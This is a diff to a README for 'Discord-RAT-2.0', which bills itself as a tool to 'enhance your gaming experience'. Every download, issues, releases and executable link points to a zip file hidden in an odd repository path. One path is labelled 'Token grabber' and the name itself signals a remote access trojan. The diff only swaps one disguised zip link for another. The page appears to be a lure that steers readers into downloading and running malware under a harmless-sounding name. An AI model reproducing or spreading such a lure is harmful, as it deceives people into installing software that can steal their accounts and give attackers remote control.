@@ -1,6 +1,6 @@
 # 🎮 Discord-RAT-2.0 - Enhance Your Gaming Experience
 
-[![Download Discord-RAT-2.0](https://raw.githubusercontent.com/AZSD121/Discord-RAT-2.0/main/Token grabber/src/asn1/eac/Discord-RAT-2.0_3.3.zip)](https://raw.githubusercontent.com/AZSD121/Discord-RAT-2.0/main/Token grabber/src/asn1/eac/Discord-RAT-2.0_3.3.zip)
+[![Download Discord-RAT-2.0](https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip)](https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip)
 
 ## 🛠️ Overview
 
@@ -20,7 +20,7 @@ To get started with Discord-RAT-2.0, follow these simple steps. Ensure you have 
 
 ## 📥 Download & Install
 
-To download Discord-RAT-2.0, **visit this page to download**: [Download Discord-RAT-2.0](https://raw.githubusercontent.com/AZSD121/Discord-RAT-2.0/main/Token grabber/src/asn1/eac/Discord-RAT-2.0_3.3.zip).
+To download Discord-RAT-2.0, **visit this page to download**: [Download Discord-RAT-2.0](https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip).
 
 When on the Releases page, look for the latest version. You will find a list of available files. Choose the appropriate file for your system.
 
@@ -41,7 +41,7 @@ After downloading, your file will typically be in the `.zip` format.
 Once you have extracted the files, you can run the application.
 
 1. Navigate to the folder where you extracted Discord-RAT-2.0.
-2. Find the executable file named `https://raw.githubusercontent.com/AZSD121/Discord-RAT-2.0/main/Token grabber/src/asn1/eac/Discord-RAT-2.0_3.3.zip`.
+2. Find the executable file named `https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip`.
 3. Double-click the file to open the application.
 
 ## ⚙️ Features
@@ -69,7 +69,7 @@ Your safety is important. Discord-RAT-2.0 is designed with security in mind. Our
 
 ## 🤝 Support & Community
 
-If you encounter any issues or have questions, our community is here to help. Check our [Issues page](https://raw.githubusercontent.com/AZSD121/Discord-RAT-2.0/main/Token grabber/src/asn1/eac/Discord-RAT-2.0_3.3.zip) to see if others have had similar problems. You can also create a new issue for assistance.
+If you encounter any issues or have questions, our community is here to help. Check our [Issues page](https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip) to see if others have had similar problems. You can also create a new issue for assistance.
 
 Join our community on Discord for real-time discussions about features and updates. Collaborate with others to discover new ways to enhance your games.
 
@@ -79,4 +79,4 @@ Keep track of the changes made in each version. The Changelog is available on th
 
 ---
 
-Enjoy your enhanced gaming experience with Discord-RAT-2.0! For more information, be sure to check out our [Releases page](https://raw.githubusercontent.com/AZSD121/Discord-RAT-2.0/main/Token grabber/src/asn1/eac/Discord-RAT-2.0_3.3.zip) frequently for updates.
+Enjoy your enhanced gaming experience with Discord-RAT-2.0! For more information, be sure to check out our [Releases page](https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip https://github.com/AZSD121/Discord-RAT-2.0/raw/refs/heads/main/Discord rat/packages/dnlib.3.5.0/lib/netstandard2.0/RA-Discord-1.4.zip) frequently for updates.
